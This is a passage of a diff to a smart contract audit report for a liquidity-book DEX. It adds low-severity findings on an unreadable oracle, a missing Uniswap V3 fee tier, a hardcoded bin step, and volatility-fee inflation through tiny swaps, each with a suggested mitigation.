-- Does NOT implement `getVolatility()`
-- Does NOT implement `getLatestPrice()`
-
-The oracle data is written but can never be read.
+The `UmbraeLBPair.sol` contract updates an internal oracle during every swap but implements no external functions to read this data. The oracle data is written but can never be read.
 
 ## Impact
 
@@ -466,4 +466,57 @@ Oracle update costs ~5,000-20,000 gas per swap with no benefit.
 
 ## Mitigation
 
-Implement the oracle getter functions or remove the oracle update logic.
+Implement oracle getter functions or remove update logic.
+
+---
+
+## [L-03] Wrong implementation in finding uniswapV3 pool
+### Description
+
+The `_findPool` function only gets pool addresses from 0.3%, 0.05%, 1% fee tiers, not getting pool address for 0.01% fee tiers. The 0.01% fee tier pools are ideal for stablecoins.
+
+## Mitigation
+
+Add the pool for 0.01% fee tier.
+
+---
+
+## [L-04] Hardcoded 25bp Bin Step causes Wrong Calculations
+### Description
+
+The `analyzePosition` function hardcodes a 25 basis point bin step when calculating price range percentage, but DLMM pairs can use different bin steps.
+
+```solidity
+uint256 binSpreadRange = maxBin - minBin;
+info.priceRangePct = binSpreadRange * 25; // basis points - HARDCODED
+```
+
+## Impact
+
+LPs see incorrect price coverage for their positions.
+
+## Mitigation
+
+Fetch the actual bin step from the pair.
+
+---
+
+## [L-05] Users could artificially increase the volatility fee
+### Description
+
+Users could execute a sequence of small swaps back and forth to artificially increase the volatility fee without paying any fee (on low liquidity pairs).
+
+## Example
+
+On a low liquidity pair (1 wei reserves), repeatedly swap back and forth:
+- No fees paid due to ultra small swaps
+- Volatility accumulator increases with each bin crossing
+- Can be done on empty markets since once deployed with a binStep, it can't be deployed again
+
+## Impact
+
+Volatility fee gets artificially increased, generating more LP fees or making pools unattractive due to high fees.
+
+## Mitigation
+
+Consider implementing a filter period (like Trader Joe), minimum swap amount, or check for 0 fee.
